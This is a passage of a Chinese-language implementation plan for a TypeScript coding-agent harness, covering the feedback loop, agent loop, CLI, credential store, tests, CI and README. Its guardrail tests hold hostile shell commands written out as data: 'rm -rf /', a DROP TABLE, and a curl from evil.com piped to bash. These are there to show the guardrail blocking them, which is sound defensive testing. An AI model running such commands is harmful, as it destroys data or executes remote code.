      const match = trimmed.match(/\(?([\w./\\-]+\.(?:ts|js|tsx|jsx)):(\d+)(?::(\d+))?\)?/);
      if (match) {
        failures.push({
          file: match[1],
          line: parseInt(match[2], 10),
          message: trimmed,
        });
      }
    }
    if (failures.length === 0 && output.trim()) {
      failures.push({
        file: null,
        line: null,
        message: output.slice(0, 500),
      });
    }
    return failures.slice(0, 20);
  }

  generateSummary(
    passed: boolean,
    category: FeedbackResult['category'],
    failures: FailureDetail[],
    _result: ToolResult,
  ): string {
    if (passed) return 'All checks passed.';
    const labels: Record<string, string> = {
      syntax_error: 'Syntax Error',
      type_error: 'Type Error',
      assertion: 'Assertion Failure',
      lint: 'Lint Error',
      timeout: 'Timeout',
      unknown: 'Unknown Error',
    };
    return [
      `[${labels[category]}]`,
      `Failures: ${failures.length}`,
      ...failures.map((f) => {
        const loc = f.file ? `${f.file}:${f.line}` : 'unknown location';
        return `  ${loc}: ${f.message.slice(0, 200)}`;
      }),
    ].join('\n');
  }

  generateFeedback(result: FeedbackResult): string {
    const status = result.passed ? 'PASSED' : 'FAILED';
    return `[Feedback] ${status} (${result.category})\n${result.summary}`;
  }
}
```

- [ ] **Step 4: 运行测试验证通过**

Run: `npx vitest run tests/feedback/feedback-loop.test.ts`
Expected: PASS (8 tests)

- [ ] **Step 5: Commit**

```bash
git add src/feedback/feedback-loop.ts tests/feedback/feedback-loop.test.ts
git commit -m "feat: 实现反馈闭环模块（主维度）" -m "FeedbackLoop 支持解析测试/lint 结果、分类失败类型（syntax_error/type_error/assertion/lint/timeout/unknown）、提取失败详情（文件名/行号/错误信息）、生成 LLM 可读的反馈摘要。分类逻辑为正则匹配，不依赖 LLM。TDD：先写测试后实现。"
```

---

### Task 7: Agent 主循环 ✅ (commit `167a9bc`)

**Files:**
- Create: `src/agent/loop.ts`
- Create: `tests/agent/loop.test.ts`

**Interfaces:**
- Consumes: `AgentConfig`, `AgentState`, `Action`, `Message`, `LLMProvider`, `MockLLMProvider` from Tasks 2-3, `ToolRegistry` from Task 4, `Guardrail` from Task 5, `FeedbackLoop` from Task 6, `Memory` from Task 2
- Produces: `AgentLoop` 类（`run` 方法）

- [ ] **Step 1: 写失败测试 tests/agent/loop.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { AgentLoop } from '../../src/agent/loop.js';
import { MockLLMProvider } from '../../src/llm/mock-provider.js';
import { ToolRegistry } from '../../src/tools/registry.js';
import { Guardrail } from '../../src/guardrail/guardrail.js';
import { FeedbackLoop } from '../../src/feedback/feedback-loop.js';
import { Memory } from '../../src/memory/memory.js';
import { AgentConfig } from '../../src/agent/types.js';
import { ReadFileTool } from '../../src/tools/read-file.js';
import { writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

function createTestEnv() {
  const dir = join(tmpdir(), `harness-test-${Date.now()}`);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'test.txt'), 'hello world');

  const config: AgentConfig = {
    maxSteps: 10,
    maxRetries: 3,
    projectRoot: dir,
    model: 'test-model',
  };

  const mockLLM = new MockLLMProvider();
  const registry = new ToolRegistry();
  registry.register(new ReadFileTool(dir));
  const guardrail = new Guardrail(dir);
  const feedback = new FeedbackLoop();
  const memory = new Memory('You are a coding agent.');

  return { dir, config, mockLLM, registry, guardrail, feedback, memory };
}

describe('AgentLoop', () => {
  it('should execute steps and stop when LLM returns stop signal', async () => {
    const { config, mockLLM, registry, guardrail, feedback, memory } = createTestEnv();
    const loop = new AgentLoop(config, mockLLM, registry, guardrail, feedback, memory);

    mockLLM.queueResponse({
      content: JSON.stringify({
        action: { type: 'read_file', params: { path: 'test.txt' }, id: '1' },
      }),
    });
    mockLLM.queueResponse({
      content: JSON.stringify({ action: null, message: 'Task complete.' }),
    });

    const result = await loop.run('Read the test file');
    expect(result.state).toBe('completed');
    expect(result.steps).toBeGreaterThan(0);
  });

  it('should stop when max steps reached', async () => {
    const { config, mockLLM, registry, guardrail, feedback, memory } = createTestEnv();
    const smallConfig = { ...config, maxSteps: 2 };
    const loop = new AgentLoop(smallConfig, mockLLM, registry, guardrail, feedback, memory);

    for (let i = 0; i < 5; i++) {
      mockLLM.queueResponse({
        content: JSON.stringify({
          action: { type: 'read_file', params: { path: 'test.txt' }, id: `${i}` },
        }),
      });
    }

    const result = await loop.run('Read file');
    expect(result.state).toBe('failed');
    expect(result.steps).toBe(2);
  });

  it('should halt on dangerous action', async () => {
    const { config, mockLLM, registry, guardrail, feedback, memory } = createTestEnv();
    const loop = new AgentLoop(config, mockLLM, registry, guardrail, feedback, memory);

    mockLLM.queueResponse({
      content: JSON.stringify({
        action: { type: 'shell', params: { command: 'rm -rf /' }, id: '1' },
      }),
    });

    const result = await loop.run('Delete everything');
    expect(result.state).toBe('need_approval');
    expect(result.steps).toBe(0);
  });
});
```

- [ ] **Step 2: 运行测试验证失败**

Run: `npx vitest run tests/agent/loop.test.ts`
Expected: FAIL

- [ ] **Step 3: 创建 src/agent/loop.ts**

```typescript
import { AgentConfig, AgentState, Action, Message, ToolResult } from './types.js';
import { LLMProvider } from '../llm/provider.js';
import { ToolRegistry } from '../tools/registry.js';
import { Guardrail } from '../guardrail/guardrail.js';
import { FeedbackLoop } from '../feedback/feedback-loop.js';
import { Memory } from '../memory/memory.js';

export interface RunResult {
  state: AgentState;
  steps: number;
  message: string;
}

const SYSTEM_PROMPT = `You are a coding agent. You help developers by executing actions on their codebase.

You MUST respond with a valid JSON object containing exactly one of:
1. An action to execute: { "action": { "type": "<tool_name>", "params": { ... }, "id": "<unique_id>" } }
2. A completion message: { "action": null, "message": "<your response>" }

Available tools: TOOL_LIST

When you receive feedback from a previous action, use it to correct your approach.`;

export class AgentLoop {
  private config: AgentConfig;
  private llm: LLMProvider;
  private tools: ToolRegistry;
  private guardrail: Guardrail;
  private feedback: FeedbackLoop;
  private memory: Memory;
  private state: AgentState = 'idle';
  private stepCount = 0;
  private retryCount = 0;

  constructor(
    config: AgentConfig,
    llm: LLMProvider,
    tools: ToolRegistry,
    guardrail: Guardrail,
    feedback: FeedbackLoop,
    memory: Memory,
  ) {
    this.config = config;
    this.llm = llm;
    this.tools = tools;
    this.guardrail = guardrail;
    this.feedback = feedback;
    this.memory = memory;
  }

  async run(task: string): Promise<RunResult> {
    this.state = 'running';
    this.stepCount = 0;
    this.retryCount = 0;

    this.memory.addMessage({ role: 'user', content: task });

    while (this.state === 'running' && this.stepCount < this.config.maxSteps) {
      this.stepCount++;

      const context = this.memory.buildContext();
      const systemPrompt = SYSTEM_PROMPT.replace(
        'TOOL_LIST',
        this.tools.getToolDescriptions(),
      );
      context[0] = { role: 'system', content: systemPrompt };

      let response;
      try {
        response = await this.llm.chat(context, { model: this.config.model });
      } catch (e) {
        this.state = 'failed';
        return { state: 'failed', steps: this.stepCount, message: `LLM error: ${e}` };
      }

      this.memory.addMessage({ role: 'assistant', content: response.content });

      const parsed = this.parseResponse(response.content);
      if (parsed === null) {
        this.state = 'completed';
        return { state: 'completed', steps: this.stepCount, message: 'Task completed.' };
      }

      if (typeof parsed === 'string') {
        this.state = 'completed';
        return { state: 'completed', steps: this.stepCount, message: parsed };
      }

      const action: Action = parsed;
      const guardResult = this.guardrail.check(action);
      if (!guardResult.allowed) {
        this.state = guardResult.needApproval ? 'need_approval' : 'failed';
        return {
          state: this.state,
          steps: this.stepCount,
          message: guardResult.reason,
        };
      }

      let toolResult: ToolResult;
      try {
        toolResult = await this.tools.execute(action);
      } catch (e) {
        toolResult = {
          success: false,
          stdout: '',
          stderr: String(e),
          exitCode: 1,
        };
      }

      const feedbackResult = this.feedback.process(toolResult);
      const feedbackText = this.feedback.generateFeedback(feedbackResult);
      this.memory.addMessage({
        role: 'tool',
        content: `Tool: ${action.type}\nResult: ${toolResult.stdout || toolResult.stderr}\n${feedbackText}`,
        toolCallId: action.id,
      });

      if (!feedbackResult.passed && this.retryCount < this.config.maxRetries) {
        this.retryCount++;
        this.memory.addMessage({
          role: 'user',
          content: `The previous action failed. Please fix the issue and try again.\n${feedbackText}`,
        });
      }
    }

    if (this.stepCount >= this.config.maxSteps) {
      this.state = 'failed';
      return { state: 'failed', steps: this.stepCount, message: 'Max steps reached.' };
    }

    return { state: this.state, steps: this.stepCount, message: 'Finished.' };
  }

  private parseResponse(content: string): Action | string | null {
    try {
      const parsed = JSON.parse(content);
      if (parsed.action === null || parsed.action === undefined) {
        return parsed.message ?? 'Task completed.';
      }
      return parsed.action as Action;
    } catch {
      const match = content.match(/\{[\s\S]*"action"[\s\S]*\}/);
      if (match) {
        try {
          const parsed = JSON.parse(match[0]);
          return parsed.action as Action;
        } catch {
          return null;
        }
      }
      return null;
    }
  }
}
```

- [ ] **Step 4: 运行测试验证通过**

Run: `npx vitest run tests/agent/loop.test.ts`
Expected: PASS (3 tests)

- [ ] **Step 5: Commit**

```bash
git add src/agent/loop.ts tests/agent/loop.test.ts
git commit -m "feat: 实现 Agent 主循环" -m "AgentLoop 负责组织上下文 → 调用 LLM → 解析动作 → 护栏检查 → 工具分发 → 反馈回灌 → 停机判断的完整循环。支持 max_steps 限制、危险动作拦截、失败反馈回灌与重试。TDD：先写测试后实现。"
```

---

### Task 8: CLI 入口 + 凭据管理 ✅ (commit `ddf8432`)

**Files:**
- Modify: `src/index.ts`
- Create: `src/config/cli.ts`
- Create: `src/config/credential-store.ts`
- Create: `src/utils/logger.ts`
- Create: `src/utils/action-parser.ts`

**Interfaces:**
- Consumes: `AgentLoop` from Task 7, `CredentialStore` from this task
- Produces: CLI 可执行程序（`harness` / `harness run` / `harness config`）

- [ ] **Step 1: 创建 src/utils/logger.ts**

```typescript
export class Logger {
  private logFile: string | null = null;

  setLogFile(path: string): void {
    this.logFile = path;
  }

  info(msg: string): void {
    const line = `[${new Date().toISOString()}] INFO  ${msg}`;
    console.log(line);
  }

  warn(msg: string): void {
    const line = `[${new Date().toISOString()}] WARN  ${msg}`;
    console.warn(line);
  }

  error(msg: string): void {
    const line = `[${new Date().toISOString()}] ERROR ${msg}`;
    console.error(line);
  }

  step(step: number, action: string, duration: number): void {
    const line = `[${new Date().toISOString()}] STEP ${step} | ${action} | ${duration}ms`;
    console.log(line);
  }
}

export const logger = new Logger();
```

- [ ] **Step 2: 创建 src/config/credential-store.ts**

```typescript
import { logger } from '../utils/logger.js';

export class CredentialStore {
  private readonly SERVICE_NAME = 'coding-agent-harness';
  private readonly ACCOUNT_NAME = 'api-key';

  async setKey(key: string): Promise<void> {
    try {
      const keytar = await import('keytar');
      await keytar.setPassword(this.SERVICE_NAME, this.ACCOUNT_NAME, key);
      logger.info('API key 已安全存储到凭据管理器');
    } catch {
      logger.warn('凭据管理器不可用，使用 .env 文件备选方案');
      const { writeFileSync } = await import('fs');
      writeFileSync('.env', `API_KEY=${key}\n`, 'utf-8');
      logger.warn('警告: .env 文件为明文存储，请勿提交到 Git');
    }
  }

  async getKey(): Promise<string | null> {
    try {
      const keytar = await import('keytar');
      const key = await keytar.getPassword(this.SERVICE_NAME, this.ACCOUNT_NAME);
      if (key) return key;
    } catch {
      // fallback to .env
    }

    try {
      const { readFileSync } = await import('fs');
      const content = readFileSync('.env', 'utf-8');
      const match = content.match(/^API_KEY=(.+)$/m);
      if (match) return match[1].trim();
    } catch {
      // .env not found
    }

    return null;
  }

  async hasKey(): Promise<boolean> {
    const key = await this.getKey();
    return key !== null;
  }

  async clearKey(): Promise<void> {
    try {
      const keytar = await import('keytar');
      await keytar.deletePassword(this.SERVICE_NAME, this.ACCOUNT_NAME);
      logger.info('API key 已从凭据管理器中清除');
    } catch {
      // ignore
    }
    try {
      const { unlinkSync } = await import('fs');
      unlinkSync('.env');
    } catch {
      // .env not found
    }
  }
}
```

- [ ] **Step 3: 创建 src/config/cli.ts**

```typescript
import { Command } from 'commander';
import { CredentialStore } from './credential-store.js';
import { logger } from '../utils/logger.js';

export function createConfigCommand(): Command {
  const configCmd = new Command('config').description('管理 API key 配置');

  configCmd
    .command('set-key')
    .description('设置 API key（隐藏输入）')
    .action(async () => {
      const readline = await import('readline');
      const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
      });

      const ask = (q: string): Promise<string> =>
        new Promise((resolve) => rl.question(q, resolve));

      const key = await ask('请输入 API key: ');
      rl.close();

      if (!key.trim()) {
        logger.error('API key 不能为空');
        process.exit(1);
      }

      const store = new CredentialStore();
      await store.setKey(key.trim());
    });

  configCmd
    .command('status')
    .description('查看 API key 配置状态')
    .action(async () => {
      const store = new CredentialStore();
      const hasKey = await store.hasKey();
      logger.info(`API key: ${hasKey ? '已配置' : '未配置'}`);
    });

  configCmd
    .command('clear-key')
    .description('清除已存储的 API key')
    .action(async () => {
      const store = new CredentialStore();
      await store.clearKey();
    });

  return configCmd;
}
```

- [ ] **Step 4: 重写 src/index.ts**

```typescript
#!/usr/bin/env node
import { Command } from 'commander';
import { createConfigCommand } from './config/cli.js';
import { CredentialStore } from './config/credential-store.js';
import { AgentLoop } from './agent/loop.js';
import { MockLLMProvider } from './llm/mock-provider.js';
import { OpenAIProvider } from './llm/openai-provider.js';
import { ToolRegistry } from './tools/registry.js';
import { ReadFileTool } from './tools/read-file.js';
import { WriteFileTool } from './tools/write-file.js';
import { ShellTool } from './tools/shell.js';
import { RunTestTool } from './tools/run-test.js';
import { LintTool } from './tools/lint.js';
import { GrepTool } from './tools/grep.js';
import { Guardrail } from './guardrail/guardrail.js';
import { FeedbackLoop } from './feedback/feedback-loop.js';
import { Memory } from './memory/memory.js';
import { AgentConfig } from './agent/types.js';
import { logger } from './utils/logger.js';

const program = new Command();

program
  .name('harness')
  .description('Coding Agent Harness — AI-powered coding assistant')
  .version('0.1.0');

program.addCommand(createConfigCommand());

program
  .command('run <task...>')
  .description('执行单次编码任务')
  .option('-m, --model <model>', 'LLM 模型', 'deepseek-v3')
  .option('-r, --root <path>', '项目根目录', process.cwd())
  .option('-s, --max-steps <number>', '最大步骤数', '30')
  .action(async (taskParts: string[], options) => {
    const task = taskParts.join(' ');
    const projectRoot = options.root;
    const model = options.model;
    const maxSteps = parseInt(options.maxSteps, 10);

    const store = new CredentialStore();
    const apiKey = await store.getKey();
    if (!apiKey) {
      logger.error('未配置 API key，请先运行: harness config set-key');
      process.exit(1);
    }

    const config: AgentConfig = { maxSteps, maxRetries: 3, projectRoot, model };

    const llm = new OpenAIProvider(
      apiKey,
      process.env.LLM_BASE_URL ?? 'https://njusehub.info/v1',
      model,
    );

    const registry = new ToolRegistry();
    registry.register(new ReadFileTool(projectRoot));
    registry.register(new WriteFileTool(projectRoot));
    registry.register(new ShellTool());
    registry.register(new RunTestTool());
    registry.register(new LintTool());
    registry.register(new GrepTool(projectRoot));

    const guardrail = new Guardrail(projectRoot);
    const feedback = new FeedbackLoop();
    const memory = new Memory('You are a coding agent.', { maxMessages: 50 });

    const loop = new AgentLoop(config, llm, registry, guardrail, feedback, memory);

    logger.info(`开始执行任务: ${task}`);
    const result = await loop.run(task);
    logger.info(`结果: ${result.state} | 步骤: ${result.steps} | ${result.message}`);
  });

program
  .action(async () => {
    logger.info('Coding Agent Harness v0.1.0');
    logger.info('输入任务描述开始交互，输入 /exit 退出');

    const store = new CredentialStore();
    const apiKey = await store.getKey();
    if (!apiKey) {
      logger.error('未配置 API key，请先运行: harness config set-key');
      process.exit(1);
    }

    const projectRoot = process.cwd();
    const config: AgentConfig = {
      maxSteps: 30,
      maxRetries: 3,
      projectRoot,
      model: 'deepseek-v3',
    };

    const llm = new OpenAIProvider(
      apiKey,
      process.env.LLM_BASE_URL ?? 'https://njusehub.info/v1',
      'deepseek-v3',
    );

    const registry = new ToolRegistry();
    registry.register(new ReadFileTool(projectRoot));
    registry.register(new WriteFileTool(projectRoot));
    registry.register(new ShellTool());
    registry.register(new RunTestTool());
    registry.register(new LintTool());
    registry.register(new GrepTool(projectRoot));

    const guardrail = new Guardrail(projectRoot);
    const feedback = new FeedbackLoop();
    const memory = new Memory('You are a coding agent.', { maxMessages: 50 });

    const loop = new AgentLoop(config, llm, registry, guardrail, feedback, memory);

    const readline = await import('readline');
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      prompt: 'harness> ',
    });

    rl.prompt();
    rl.on('line', async (line: string) => {
      const trimmed = line.trim();
      if (trimmed === '/exit' || trimmed === '/quit') {
        rl.close();
        return;
      }
      if (!trimmed) {
        rl.prompt();
        return;
      }

      const result = await loop.run(trimmed);
      logger.info(`[${result.state}] ${result.message}`);
      rl.prompt();
    });

    rl.on('close', () => {
      logger.info('再见！');
      process.exit(0);
    });
  });

program.parse();
```

- [ ] **Step 5: 运行 npm run build 验证编译**

Run: `npm run build`
Expected: 编译成功

- [ ] **Step 6: Commit**

```bash
git add src/index.ts src/config/ src/utils/
git commit -m "feat: 实现 CLI 入口和凭据管理" -m "CLI 入口支持 REPL 交互模式（harness）和单次任务模式（harness run <task>）。凭据管理支持 Windows Credential Manager（keytar）和 .env 备选。config 子命令支持 set-key（隐藏输入）、status（仅显示已配置/未配置）、clear-key。"
```

---

### Task 9: 机制演示 + 全部测试验证

**Files:**
- Create: `tests/demo/demo.test.ts`

**Interfaces:**
- Consumes: All modules from Tasks 1-8
- Produces: 3 个机制演示场景的测试

- [ ] **Step 1: 创建 tests/demo/demo.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { Guardrail } from '../../src/guardrail/guardrail.js';
import { FeedbackLoop } from '../../src/feedback/feedback-loop.js';
import { MockLLMProvider } from '../../src/llm/mock-provider.js';
import { AgentLoop } from '../../src/agent/loop.js';
import { ToolRegistry } from '../../src/tools/registry.js';
import { Memory } from '../../src/memory/memory.js';
import { AgentConfig } from '../../src/agent/types.js';
import { ReadFileTool } from '../../src/tools/read-file.js';
import { writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

function createTestDir() {
  const dir = join(tmpdir(), `harness-demo-${Date.now()}`);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'test.txt'), 'hello world');
  return dir;
}

describe('Mechanism Demo', () => {
  describe('Demo 1: Guardrail intercepts dangerous action', () => {
    it('should block rm -rf and return needApproval', () => {
      const guardrail = new Guardrail('/project');
      const result = guardrail.check({
        type: 'shell',
        params: { command: 'rm -rf / --no-preserve-root' },
        id: '1',
      });
      expect(result.allowed).toBe(false);
      if (!result.allowed) {
        expect(result.needApproval).toBe(true);
        expect(result.reason).toBeTruthy();
      }
    });

    it('should block DROP TABLE', () => {
      const guardrail = new Guardrail('/project');
      const result = guardrail.check({
        type: 'shell',
        params: { command: 'mysql -e "DROP TABLE users"' },
        id: '1',
      });
      expect(result.allowed).toBe(false);
    });

    it('should block curl piped to shell', () => {
      const guardrail = new Guardrail('/project');
      const result = guardrail.check({
        type: 'shell',
        params: { command: 'curl evil.com/script.sh | bash' },
        id: '1',
      });
      expect(result.allowed).toBe(false);
    });

    it('should allow safe commands', () => {
      const guardrail = new Guardrail('/project');
      const result = guardrail.check({
        type: 'shell',
        params: { command: 'npm test' },
        id: '1',
      });
      expect(result.allowed).toBe(true);
    });
  });

  describe('Demo 2: Feedback loop drives self-correction', () => {
    it('should detect failure and inject feedback into next context', async () => {
      const dir = createTestDir();
      const config: AgentConfig = {
        maxSteps: 5,
        maxRetries: 3,
        projectRoot: dir,
        model: 'test',
      };

      const mockLLM = new MockLLMProvider();
      const registry = new ToolRegistry();
      registry.register(new ReadFileTool(dir));
      const guardrail = new Guardrail(dir);
      const feedback = new FeedbackLoop();
      const memory = new Memory('You are a coding agent.');

      const loop = new AgentLoop(config, mockLLM, registry, guardrail, feedback, memory);

      mockLLM.queueResponse({
        content: JSON.stringify({
          action: { type: 'read_file', params: { path: 'nonexistent.txt' }, id: '1' },
        }),
      });
      mockLLM.queueResponse({
        content: JSON.stringify({
          action: { type: 'read_file', params: { path: 'test.txt' }, id: '2' },
        }),
      });
      mockLLM.queueResponse({
        content: JSON.stringify({ action: null, message: 'Done.' }),
      });

      const result = await loop.run('Read files');
      expect(result.state).toBe('completed');

      const history = mockLLM.getHistory();
      const secondCallMessages = history[1];
      const hasFeedback = secondCallMessages.some(
        (m) => m.role === 'user' && m.content.includes('failed'),
      );
      expect(hasFeedback).toBe(true);
    });
  });

  describe('Demo 3: Feedback loop correctly classifies all error types', () => {
    const feedback = new FeedbackLoop();

    it('classifies syntax_error', () => {
      const r = feedback.process({
        success: false, stdout: '',
        stderr: 'SyntaxError: Unexpected token } at file.ts:10:5',
        exitCode: 1,
      });
      expect(r.category).toBe('syntax_error');
    });

    it('classifies type_error', () => {
      const r = feedback.process({
        success: false, stdout: '',
        stderr: "error TS2322: Type 'string' is not assignable to type 'number'.",
        exitCode: 2,
      });
      expect(r.category).toBe('type_error');
    });

    it('classifies assertion', () => {
      const r = feedback.process({
        success: false, stdout: '',
        stderr: 'AssertionError: expected 1 to equal 2',
        exitCode: 1,
      });
      expect(r.category).toBe('assertion');
    });

    it('classifies lint', () => {
      const r = feedback.process({
        success: false, stdout: '5 problems (3 errors, 2 warnings)',
        stderr: '',
        exitCode: 1,
      });
      expect(r.category).toBe('lint');
    });

    it('classifies timeout', () => {
      const r = feedback.process({
        success: false, stdout: '',
        stderr: 'ETIMEDOUT: operation timed out',
        exitCode: 124,
      });
      expect(r.category).toBe('timeout');
    });
  });
});
```

- [ ] **Step 2: 运行全部测试**

Run: `npx vitest run`
Expected: 所有测试通过

- [ ] **Step 3: Commit**

```bash
git add tests/demo/demo.test.ts
git commit -m "test: 添加机制演示测试" -m "3 个演示场景：① 治理护栏拦截危险动作（rm -rf、DROP TABLE、curl | sh）；② 反馈闭环驱动自我修正（注入失败后 agent 收到反馈并改变行为）；③ 反馈闭环正确分类所有错误类型（syntax_error/type_error/assertion/lint/timeout）。所有测试均使用 mock LLM，不依赖网络和真实 LLM。"
```

---

### Task 10: CI 配置 + README ✅ (commit `4dc8739`)

**Files:**
- Create: `.github/workflows/ci.yml`
- Create: `README.md`

**Interfaces:**
- Consumes: nothing
- Produces: CI 自动运行测试，README 完整文档

- [ ] **Step 1: 创建 .github/workflows/ci.yml**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  unit-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18.x, 20.x]
    steps:
      - uses: actions/checkout@v4
      - name: Use Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      - run: npm ci
      - run: npm test
      - run: npm run build
```

- [ ] **Step 2: 创建 README.md**

```markdown
# Coding Agent Harness

AI-powered coding assistant harness with feedback loop and guardrails.

## 安装

npm install -g @rjj-maker/coding-agent-harness

## 使用

### 交互式 REPL

harness

输入任务描述，agent 连续执行编码操作。输入 `/exit` 退出。

### 单次任务

harness run "在 src/utils.ts 中创建 add 函数"

### 配置 API Key

harness config set-key    # 设置 API key（隐藏输入）
harness config status     # 查看配置状态
harness config clear-key  # 清除 API key

## 安全配置

### 凭据存储

- **主方案**：Windows Credential Manager / macOS Keychain / Linux libsecret
- **备选方案**：`.env` 文件中的 `API_KEY` 变量
- **警告**：`.env` 为明文存储，请勿提交到 Git

### 环境变量

| 变量 | 说明 | 默认值 |
|------|------|--------|
| `LLM_BASE_URL` | LLM API 地址 | `https://njusehub.info/v1` |

## 目录结构

src/
  index.ts              CLI 入口
  config/               凭据管理
  llm/                  LLM 抽象层（OpenAI 兼容 + Mock）
  agent/                Agent 主循环 + 类型定义
  tools/                工具系统（6 个工具）
  guardrail/            治理护栏
  feedback/             反馈闭环
  memory/               记忆模块
  utils/                工具函数
tests/                  单元测试

## 命令

npm install       # 安装依赖
npm test          # 运行测试
npm run build     # 编译
npm run lint      # 代码检查

## 已知限制

- 平台：Windows / macOS / Linux（Node.js >= 18）
- 凭据存储：Windows 使用 Credential Manager，macOS 使用 Keychain，Linux 使用 libsecret
- 文件操作限制在项目根目录内
- Agent 最多执行 30 步后自动停机
- 反馈修正最多 3 轮自动重试

## 技术栈

- TypeScript + Node.js 18+
- Commander.js（CLI 框架）
- OpenAI SDK（LLM 抽象层）
- keytar（凭据存储）
- Vitest（测试框架）

## License

MIT
```

- [ ] **Step 3: Commit**

```bash
git add .github/workflows/ci.yml README.md
git commit -m "docs: 添加 CI 配置和 README" -m "CI 包含 unit-test job（Node.js 18/20），每次 push 自动运行测试和构建。README 包含安装、使用、安全配置、目录结构、命令说明和已知限制。"
```

---

### Task 11: SPEC_PROCESS.md + AGENT_LOG.md

**Files:**
- Create: `SPEC_PROCESS.md`
- Create: `AGENT_LOG.md`

**Interfaces:**
- Consumes: nothing
- Produces: 过程文档

- [ ] **Step 1: 创建 SPEC_PROCESS.md 骨架**

```markdown
# SPEC_PROCESS.md — 规约与计划生成过程

## brainstorming 关键节点

### 设计决策记录

| 决策 | 选项 | 选择 | 理由 |
|------|------|------|------|
| 编程语言 | TS/Python/Go/Rust | TypeScript | 与 Superpowers 同栈，npm 生态丰富 |
| 主维度 | 治理/反馈/记忆/扩展 | 反馈闭环 | 逻辑简单直接，mock 测试友好，与 Coding 场景高度契合 |
| 工具集 | 最小/标准/完整 | 标准集 | 反馈闭环需要测试/lint 输出作为信号 |
| 分发 | Docker/二进制/npm | npm | TypeScript 项目自然选择 |
| LLM 层 | 单供应商/多供应商 | 多供应商 | 抽象层设计为 OpenAI 兼容格式 |
| CLI 形态 | REPL/单次/两者 | 两者 | 开发成本差异不大，覆盖两种场景 |

### 智能体追问的关键问题

1. 编程语言选择
2. 主维度（深度方向）选择
3. 工具集范围
4. 分发形态
5. LLM 供应商策略
6. CLI 交互模式

### 我推翻或修正的设计

- 最初考虑 WebUI 部署，后经助教确认只需 CLI，去掉了 WebUI 和线上部署部分
- 主维度从"治理"改为"反馈闭环"，因为反馈闭环更容易实现且有充足的工程深度

### 反思

brainstorming 技能做得好：逐块呈现设计并确认，每个设计块都明确到可编码的程度；结构清晰，覆盖了通用要求提出的所有方面。

不足：设计块之间有时缺少关联性说明，需要在 SPEC 中自行补充数据流和组件关系。
```

- [ ] **Step 2: 创建 AGENT_LOG.md 骨架**

```markdown
# AGENT_LOG.md — 实现过程日志

## 2026-08-13

### Task 1: 项目脚手架
- **技能**: subagent-driven-development
- **Commit**: `04e90c2` - 项目脚手架（package.json、tsconfig、vitest、eslint、.gitignore、src/index.ts）
- **人工干预**: 无

### Task 2: 核心类型定义 + 记忆模块 ✅ (commit `ae9171c`)
- **技能**: TDD (test-driven-development)
- **Commit**: (待填入)
- **人工干预**: 无

### Task 3: LLM 抽象层
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 4: 工具系统
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 5: 治理护栏
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 6: 反馈闭环
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 7: Agent 主循环
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 8: CLI + 凭据
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 9: 机制演示
- **技能**: TDD
- **Commit**: (待填入)
- **人工干预**: 无

### Task 10: CI + README
- **Commit**: (待填入)
- **人工干预**: 无

### Task 11: 过程文档
- **Commit**: (待填入)
- **人工干预**: 无
```

- [ ] **Step 3: Commit**

```bash
git add SPEC_PROCESS.md AGENT_LOG.md
git commit -m "docs: 添加 SPEC_PROCESS.md 和 AGENT_LOG.md 骨架" -m "SPEC_PROCESS 记录 brainstorming 设计决策、智能体追问的关键问题和个人反思。AGENT_LOG 为后续实现过程日志预留框架。"
```

---

## 依赖关系

```
Task 1 (脚手架)
  └── Task 2 (类型 + 记忆)
        ├── Task 3 (LLM 抽象层)
        ├── Task 4 (工具系统)
        ├── Task 5 (治理护栏)
        ├── Task 6 (反馈闭环)
        └── Task 7 (Agent 主循环) ← 依赖 Task 2-6
              └── Task 8 (CLI + 凭据) ← 依赖 Task 7
                    └── Task 9 (机制演示) ← 依赖 Task 1-8 全部
                          └── Task 10 (CI + README) ← 可并行
                          └── Task 11 (过程文档) ← 可并行
```

**可并行任务**：Task 3/4/5/6 可并行（都只依赖 Task 2）；Task 10/11 可并行（无依赖）。